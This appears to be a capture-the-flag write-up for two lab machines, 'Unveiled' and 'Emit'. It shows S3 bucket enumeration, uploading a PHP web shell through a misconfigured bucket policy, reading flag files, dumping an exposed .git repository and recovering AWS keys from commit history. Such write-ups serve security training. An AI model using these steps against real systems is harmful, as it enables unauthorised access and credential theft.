## Unveiled

```

sudo echo 'IP s3.unveiled.htb unveiled.htb' >>/etc/hosts

aws --endpoint-url=http://s3.unveiled.htb s3 ls
230131 unveiled-backups
230131 website-assets


aws --endpoint-url=http://s3.unveiled.htb s3 ls s3://unveiled-backups

aws --endpoint-url=http://s3.unveiled.htb s3 cp s3://unveiled-backups . --recursive
```

Finding a terraform file, while reading it we can find a misconfiguration

```terraform
variable "aws_access_key"{
  default = ""
}
variable "aws_secret_key"{
  default = ""
}

provider "aws" {
  access_key=var.aws_access_key
  secret_key=var.aws_secret_key
}

resource "aws_s3_bucket" "unveiled-backups" {
  bucket = "unveiled-backups"
  acl    = "private"
  tags = {
    Name        = "S3 Bucket"
    Environment = "Prod"
  }
  versioning {
    enabled = true
  }
}

resource "aws_s3_bucket_acl" "bucket_acl" {
  bucket = aws_s3_bucket.unveiled-backups.id
  acl    = "public-read"
}

resource "aws_s3_bucket" "website-assets" {
  bucket = "website-assets"
  acl    = "private"
}

data "aws_iam_policy_document" "allow_s3_access" {
  statement {
    principals {
      type        = "AWS"
      identifiers = ["683633011377"]
    }

    actions = [
      "s3:GetObject",
      "s3:ListBucket",
      "s3:PutObject"
    ]

    resources = [
      aws_s3_bucket.website-assets.arn,
      "${aws_s3_bucket.website-assets.arn}/*",
    ]
  }

resource "aws_s3_bucket_policy" "bucket_policy" {
  bucket = aws_s3_bucket.website-assets.id
  policy = data.aws_iam_policy_document.allow_s3_access.json
}
}
```

So, we can upload a php file, let's upload a php web shell.

```
aws --endpoint-url=http://s3.unveiled.htb s3 cp exploit.php s3://website-assets/exploit.php --profile=todelete
```

```shell
find / -name flag.txt  -exec cat {}\;
```

## Emit

-Nmap output

```shell


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-git:
|   10.129.245.222:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating agents
|_http-title: Satellite Management System
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Used the `git-dumper` tool to retrieve the git repo

```
mkdir dumped_repo
git-dumper http://url/ dumper-repo
cd dumper-repo
ls

> ssm_agent.py
```

Now let's analyze the CDK code

```
import boto3
import os

# Retrieve AWS credentials from environment variables
access_key_id = os.environ.get('AWS_ACCESS_KEY_ID')
secret_access_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
region = os.environ.get('AWS_DEFAULT_REGION')
endpoint_url = 'http://cloud.emit.htb' #Localstack v0.12.6

# Create an AWS session using the retrieved credentials and region
session = boto3.Session(
    aws_access_key_id=access_key_id,
    aws_secret_access_key=secret_access_key,
    region_name=region
)

def create_document(name, content):
    ssm_client = session.client('ssm')

    response = ssm_client.create_document(
        Content=content,
        Name=name,
    )

    document_version = response['DocumentDescription']['DocumentVersion']
    document_name = response['DocumentDescription']['Name']
    print(f"Document '{document_name}' created with version: {document_version}")

def add_tags_to_resource(resource_arn, tags):
    ssm_client = session.client('ssm')

    response = ssm_client.add_tags_to_resource(
        ResourceType='Document',
        ResourceId=resource_arn,
        Tags=tags,
    )

    print(f"Tags added to resource: {resource_arn}")

def send_command_to_instances(instance_ids, command):
    ssm_client = session.client('ssm')

    response = ssm_client.send_command(
        DocumentName='AWS-RunShellScript',
        InstanceIds=instance_ids,
        Parameters={'commands': [command]},
    )

    command_id = response['Command']['CommandId']
    print(f"Command '{command}' sent to instances: {', '.join(instance_ids)}")
    print(f"Command ID: {command_id}")

# Example usage
if __name__ == '__main__':
    # Create an SSM document
    document_name = 'MySSMDocument'
    document_content = '''
        {
            "schemaVersion": "2.2",
            "description": "My SSM document",
            "mainSteps": [
                {
                    "name": "RunCommand",
                    "action": "aws:runShellScript",
                    "inputs": {
                        "runCommand": [
                            "echo 'Running custom script'"
                        ]
                    }
                }
            ]
        }
    '''
    create_document(document_name, document_content)

    # Add tags to an AWS resource (SSM document)
    resource_arn = f"arn:aws:ssm:{region}:123456789012:document/{document_name}"
    tags = [
        {'Key': 'Environment', 'Value': 'Production'},
        {'Key': 'Project', 'Value': 'Payload Control System'},
    ]
    add_tags_to_resource(resource_arn, tags)

    # Send a command to EC2 instances
    instance_ids = ['i-0b6abfb4681d96994', 'i-0a2aff07a25c66208']
    command = ''
    send_command_to_instances(instance_ids, command)
```

We can see the localstack endpoint, I will add it

```shell

echo 'IP cloud.emit.htb >> /etc/hosts'
```

Going back into previous commits :

```
commit 9cb739e6e09e04bba0aa08b486f58923fb5db514
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:22:49 2023 +0000

    Redeploying stack

```

```
git diff 9cb739e6e09e04bba0aa08b486f58923fb5db514
``

>> -access_key_id = "AKIA6CFMOGSLALOPETMB"
>> -secret_access_key = "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"
>> -region = "us-east-2"
```
